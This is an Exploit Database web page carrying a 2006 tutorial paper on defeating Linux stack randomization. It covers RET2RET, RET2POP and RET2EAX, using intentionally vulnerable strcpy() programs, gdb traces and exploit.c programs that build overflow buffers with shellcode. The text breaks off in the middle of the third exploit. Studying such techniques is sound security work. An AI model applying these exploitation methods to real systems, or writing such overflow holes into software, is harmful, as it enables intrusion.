<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="uKaaJBkEHDGCThWdhZeg8TYfczp9tXfRwi2jIdoP">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Smack the Stack (Advanced Buffer Overflow Methods)</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/13232">
    <meta name="description" content="Smack the Stack (Advanced Buffer Overflow Methods)">
    <meta name="keywords" content="AIX,papers">
    <meta name="author" content="izik">

    <meta property="og:title" content="Smack the Stack (Advanced Buffer Overflow Methods)">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/13232">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2006-03-10" />
        <meta property="article:author" content="izik" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=2522" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Smack the Stack (Advanced Buffer Overflow Methods)">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Smack the Stack (Advanced Buffer Overflow Methods)
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                13232
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=2522">
                                                                    izik
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/13232" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 13232">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/13232" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 13232">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=aix">
                                                                    AIX
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2006-03-10
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13231" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/13233" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">-----------------------------------------------------
		oO Smack the Stack Oo
	( Advanced Buffer Overflow Methods )
		Izik &lt;izik@tty64.org&gt;
-----------------------------------------------------

	From time to time, a new patch or security feature is integrated to raise the bar on buffer overflow exploiting.
	This paper includes five creative methods to overcome various stack protection patches, but in practical focus on
	the VA (Virtual Address) space randomization patch that have been integrated to Linux 2.6 kernel. These methods are
        not limited to this patch or another, but rather provide a different approach to the buffer overflow exploiting scheme.

VA Patch
--------

	Causes certain parts of a process virtual address space to be different for each invocation of the process.
	The purpose of this is to raise the bar on buffer overflow exploits. As full randomization makes it not possible to 
	use absolute addresses in the exploit. Randomizing the stack pointer and mmap() addresses. Which also effects where 
	shared libraries goes, among other things. The stack is randomized within an 8Mb range and applies to ELF binaries.
	The patch intedned to be an addition to the NX support that was added to the 2.6 kernel earlier as well. This paper
	however addressed it as solo.

Synchronize
-----------

	My playground box is running on an x86 box, armed with Linux kernel 2.6.12.2, glibc-2.3.5 and gcc-3.3.6
	
Stack Juggling
--------------

	Stack juggling methods take their advantages off a certain stack layout/program flow or a registers changes.
	Due to the nature of these factors, they might not fit to every situation.

	RET2RET
	-------

		This method relies on a pointer previously stored on the stack as a potential return address to the shellcode.

		A potential return address is a base address of a pointer in the upper stack frame, above the saved return address.
		The pointer itself is not required to point directly to the shellcode, but rather to fit a byte-alignment.

		The gap between the location of the potential return address on the stack and the shellcode, padded with addresses
		that contain a RET instruction. The purpose of RET will be somewhat similar to a NOP with a tweak, as each RET
		performs a POP action and increase ESP by 4 bytes, and then afterward jumps to the next one. The last RET will jump to
		the potential return address and will lead to the shellcode.

		--- snip snip ---
		
			/*
			 * vuln.c, Classical strcpy() buffer overflow
			 */

			#include &lt;stdio.h&gt;
			#include &lt;stdlib.h&gt;
			#include &lt;unistd.h&gt;
			#include &lt;string.h&gt;

			int main(int argc, char **argv) {
				char buf[256];
				strcpy(buf, argv[1]);
				return 1;
			}

		--- snip snip ---
	
		Starting with determining &#039;buf&#039; variable addresses range on the stack
				
			(gdb) disassemble main
			Dump of assembler code for function main:
			0x08048384 &lt;main+0&gt;:    push   %ebp
			0x08048385 &lt;main+1&gt;:    mov    %esp,%ebp
			0x08048387 &lt;main+3&gt;:    sub    $0x108,%esp
			0x0804838d &lt;main+9&gt;:    and    $0xfffffff0,%esp
			0x08048390 &lt;main+12&gt;:   mov    $0x0,%eax
			0x08048395 &lt;main+17&gt;:   sub    %eax,%esp
			0x08048397 &lt;main+19&gt;:   sub    $0x8,%esp
			0x0804839a &lt;main+22&gt;:   mov    0xc(%ebp),%eax
			0x0804839d &lt;main+25&gt;:   add    $0x4,%eax
			0x080483a0 &lt;main+28&gt;:   pushl  (%eax)
			0x080483a2 &lt;main+30&gt;:   lea    0xfffffef8(%ebp),%eax
			0x080483a8 &lt;main+36&gt;:   push   %eax			
			0x080483a9 &lt;main+37&gt;:   call   0x80482b0 &lt;_init+56&gt;
			0x080483ae &lt;main+42&gt;:   add    $0x10,%esp
			0x080483b1 &lt;main+45&gt;:   mov    $0x1,%eax
			0x080483b6 &lt;main+50&gt;:   leave
			0x080483b7 &lt;main+51&gt;:   ret
			0x080483b8 &lt;main+52&gt;:   nop
			0x080483b9 &lt;main+53&gt;:   nop
			0x080483ba &lt;main+54&gt;:   nop
			0x080483bb &lt;main+55&gt;:   nop
			0x080483bc &lt;main+56&gt;:   nop
			0x080483bd &lt;main+57&gt;:   nop
			0x080483be &lt;main+58&gt;:   nop
			0x080483bf &lt;main+59&gt;:   nop
			End of assembler dump.
			(gdb)

		Putting a breakpoint prior to strcpy() function invocation and examining the passed pointer of &#039;buf&#039; variable

			(gdb) break *main+37
			Breakpoint 1 at 0x80483a9
			(gdb) run `perl -e &#039;print &quot;A&quot;x272&#039;`
			Starting program: /tmp/vuln `perl -e &#039;print &quot;A&quot;x272&#039;`

			Breakpoint 1, 0x080483a9 in main ()
			(gdb) print (void *) $eax
			$1 = (void *) 0xbffff5d0
			(gdb)

		Simple calculation gives &#039;buf&#039; variable range [ 0xbffff6d8 - 0xbffff5d0 ] / ( 264 bytes ; 0x108h )
		After establishing the target range, the search for potential return addresses in the upper stack frame begins
			
			(gdb) x/a $ebp+8
			0xbffff6e0:     0x2
			(gdb) x/a $ebp+12
			0xbffff6e4:     0xbffff764
			(gdb) x/a $ebp+16
			0xbffff6e8:     0xbffff770
			(gdb) x/a $ebp+20
			0xbffff6ec:     0xb800167c
			(gdb) x/a $ebp+24
			0xbffff6f0:     0xb7fdb000 &lt;svcauthsw+692&gt;
			(gdb) x/a $ebp+28
			0xbffff6f4:     0xbffff6f0
			(gdb)
		
		The address [ 0xbffff6f4 ] is a pointer to [ 0xbffff6f0 ], and [ 0xbffff6f0 ] is only 24 bytes away from [ 0xbffff6d8 ]
		This, after the byte-alignment conversion, will be pointing inside the target range.

		The byte-alignment is a result of the trailing NULL byte, as the nature of strings in C language to be NULL terminated
		combined with the IA32 (Little Endian) factor. The [ 0xbffff6f0 ] address will be changed to [ 0xbffff600 ], which in
		our case saves the day and produces a return address to the shellcode.

		--- snip snip ---

			/*
		 	 * exploit.c, Exploits vuln.c (RET2RET)
			 */

			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;
			
			char evilbuf[] =

	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
		
								// 
				&quot;\x31\xc0&quot;			// xorl %eax, %eax
				&quot;\x31\xdb&quot;			// xorl %ebx, %ebx
				&quot;\x40&quot;				// incl %eax
				&quot;\xcd\x80&quot;			// int $0x80
								//
	
								//
				&quot;\xb7\x83\x04\x08&quot;		// RET ADDRESS / 0x080483b7 &lt;main+51&gt;:   ret
								//

				&quot;\xb7\x83\x04\x08&quot;		//
				&quot;\xb7\x83\x04\x08&quot;		//
				&quot;\xb7\x83\x04\x08&quot;		// RET&#039;s x 5
				&quot;\xb7\x83\x04\x08&quot;		//
				&quot;\xb7\x83\x04\x08&quot;;		//

			int main(int argc, char **argv, char **envp) {
				char *args[] = { &quot;vuln&quot; , evilbuf , NULL };
				return execve(&quot;vuln&quot;, args, envp);
			}

		--- snip snip ---

	RET2POP
	-------

		This method reassembles the previous method, except it&#039;s focused on a buffer overflow within a program function scope.

		Functions that take a buffer as an argument, which later on will be comprised within the function to said buffer overflow, 
		give a great service, as the pointer becomes the perfect potential return address.  Ironically, the same byte-alignment 
		effect applies here as well, and thus prevents it from using it as perfect potential... but only in a case of when the 
		buffer argument is being passed as the 1st argument or as the only argument.

		--- snip snip ---

			/*
			 * vuln.c, Standard strcpy() buffer overflow within a function
			 */ 

			#include &lt;stdio.h&gt;
			#include &lt;stdlib.h&gt;
			#include &lt;unistd.h&gt;

			int foobar(int x, char *str) {
				char buf[256];
				strcpy(buf, str);
				return x;
			}

			int main(int argc, char **argv) {
				foobar(64, argv[1]);
				return 1;
			}			

		--- snip snip ---

		But when having the buffer passed as the 2nd or higher argument to the function is a whole different story.
		Then it is possible to preserve the pointer, but requires a new combo.
	
			(gdb) disassemble frame_dummy
			Dump of assembler code for function frame_dummy:
			0x08048350 &lt;frame_dummy+0&gt;:     push   %ebp
			0x08048351 &lt;frame_dummy+1&gt;:     mov    %esp,%ebp
			0x08048353 &lt;frame_dummy+3&gt;:     sub    $0x8,%esp
			0x08048356 &lt;frame_dummy+6&gt;:     mov    0x8049508,%eax
			0x0804835b &lt;frame_dummy+11&gt;:    test   %eax,%eax
			0x0804835d &lt;frame_dummy+13&gt;:    je     0x8048380 &lt;frame_dummy+48&gt;
			0x0804835f &lt;frame_dummy+15&gt;:    mov    $0x0,%eax
			0x08048364 &lt;frame_dummy+20&gt;:    test   %eax,%eax
			0x08048366 &lt;frame_dummy+22&gt;:    je     0x8048380 &lt;frame_dummy+48&gt;
			0x08048368 &lt;frame_dummy+24&gt;:    sub    $0xc,%esp
			0x0804836b &lt;frame_dummy+27&gt;:    push   $0x8049508
			0x08048370 &lt;frame_dummy+32&gt;:    call   0x0
			0x08048375 &lt;frame_dummy+37&gt;:    add    $0x10,%esp
			0x08048378 &lt;frame_dummy+40&gt;:    nop
			0x08048379 &lt;frame_dummy+41&gt;:    lea    0x0(%esi),%esi
			0x08048380 &lt;frame_dummy+48&gt;:    mov    %ebp,%esp
			0x08048382 &lt;frame_dummy+50&gt;:    pop    %ebp
			0x08048383 &lt;frame_dummy+51&gt;:    ret
			End of assembler dump.
			(gdb)

		The gcc compiler will normally produce the &#039;LEAVE&#039; instruction, unless the user passed the &#039;-O2&#039; option to gcc.
		Whatever the actual program code doesn&#039;t supply, the CRT objects will. Part of the optimization issues tearing 
		down the &#039;LEAVE&#039; instruction to pieces gives us the benefit of having the ability to use only what&#039;s needed for us.

			0x08048380 &lt;frame_dummy+48&gt;:    mov    %ebp,%esp
			0x08048382 &lt;frame_dummy+50&gt;:    pop    %ebp
			0x08048383 &lt;frame_dummy+51&gt;:    ret
		
		The combination of POP followed by RET would result in skipping over the 1st argument and jump directly to the 2nd argument. 
		On top of that it would also be the final knockout punch needed to win this situation.
	
		Because CRT objects have been included within every program, unless of course the user specified otherwise, it is a rich source
		of assembly snippets that can be tweaked.

		--- snip snip ---

			/*
		  	 * exploit.c, Exploits vuln.c (RET2POP)
			 */

			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;

			char evilbuf[] =

								// 
				&quot;\x31\xc0&quot;			// xorl %eax, %eax
				&quot;\x31\xdb&quot;			// xorl %ebx, %ebx
				&quot;\x40&quot;				// incl %eax
				&quot;\xcd\x80&quot;			// int $0x80
								//

	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
				
								//
				&quot;\x82\x83\x04\x08&quot;;		// RET ADDRESS
								// 
								// 	0x08048382 &lt;frame_dummy+50&gt;:    pop    %ebp
								// 	0x08048383 &lt;frame_dummy+51&gt;:    ret
								//

			int main(int argc, char **argv, char **envp) {
				char *args[] = { &quot;vuln&quot; , evilbuf , NULL };
				return execve(&quot;vuln&quot;, args, envp);
			}

		--- snip snip ---

		Snooping around the CRT functions, another powerful combination can be found inside the &#039;__do_global_ctors_aux&#039; implementation
			
			0x080484cc &lt;__do_global_ctors_aux+44&gt;:  pop    %eax
			0x080484cd &lt;__do_global_ctors_aux+45&gt;:  pop    %ebx
			0x080484ce &lt;__do_global_ctors_aux+46&gt;:  pop    %ebp
			0x080484cf &lt;__do_global_ctors_aux+47&gt;:  ret

		But that&#039;s for a whole other story ... ;-)
	
	RET2EAX
	-------

		This method relies on the convention that functions uses EAX register to store the return value.

		The implementation of return values from functions and syscalls is done via the EAX register.  This of course
		is another great service, so that a function that had buffer overflow in it is also kind enough to return back
		the buffer.  We have EAX that contains a perfect potential return address to the shellcode.

		--- snip snip ---

			/*
			 * vuln.c, Exotic strcpy() buffer overflow
			 */

			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;
			#include &lt;string.h&gt;

			char *foobar(char *str) {
				char *ptr, buf[256];
				ptr = strcpy(buf, str);
				return ptr;
			}

			int main(int argc, char **argv) {
				foobar(argv[1]);
				return 1;
			}

		--- snip snip ---

		Again we return to the CRT function for salvation

			(gdb) disassemble __do_global_ctors_aux
			Dump of assembler code for function __do_global_ctors_aux:
			0x080484a0 &lt;__do_global_ctors_aux+0&gt;:   push   %ebp
			0x080484a1 &lt;__do_global_ctors_aux+1&gt;:   mov    %esp,%ebp
			0x080484a3 &lt;__do_global_ctors_aux+3&gt;:   push   %ebx
			0x080484a4 &lt;__do_global_ctors_aux+4&gt;:   push   %edx
			0x080484a5 &lt;__do_global_ctors_aux+5&gt;:   mov    0x80494f8,%eax
			0x080484aa &lt;__do_global_ctors_aux+10&gt;:  cmp    $0xffffffff,%eax
			0x080484ad &lt;__do_global_ctors_aux+13&gt;:  mov    $0x80494f8,%ebx
			0x080484b2 &lt;__do_global_ctors_aux+18&gt;:  je     0x80484cc &lt;__do_global_ctors_aux+44&gt;
			0x080484b4 &lt;__do_global_ctors_aux+20&gt;:  lea    0x0(%esi),%esi
			0x080484ba &lt;__do_global_ctors_aux+26&gt;:  lea    0x0(%edi),%edi
			0x080484c0 &lt;__do_global_ctors_aux+32&gt;:  sub    $0x4,%ebx
			0x080484c3 &lt;__do_global_ctors_aux+35&gt;:  call   *%eax
			0x080484c5 &lt;__do_global_ctors_aux+37&gt;:  mov    (%ebx),%eax
			0x080484c7 &lt;__do_global_ctors_aux+39&gt;:  cmp    $0xffffffff,%eax
			0x080484ca &lt;__do_global_ctors_aux+42&gt;:  jne    0x80484c0 &lt;__do_global_ctors_aux+32&gt;
			0x080484cc &lt;__do_global_ctors_aux+44&gt;:  pop    %eax
			0x080484cd &lt;__do_global_ctors_aux+45&gt;:  pop    %ebx
			0x080484ce &lt;__do_global_ctors_aux+46&gt;:  pop    %ebp
			0x080484cf &lt;__do_global_ctors_aux+47&gt;:  ret
			End of assembler dump.
			(gdb)

		The abstract implementation of &#039;__do_global_ctors_aux&#039; includes a sweet CALL instruction. And wins this match!

		--- snip snip ---

			/*
			 * exploit.c, Exploits vuln.c (RET2EAX)
			 */

			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;

			char evilbuf[] =

								// 
				&quot;\x31\xc0&quot;			// xorl %eax, %eax
				&quot;\x31\xdb&quot;			// xorl %ebx, %ebx
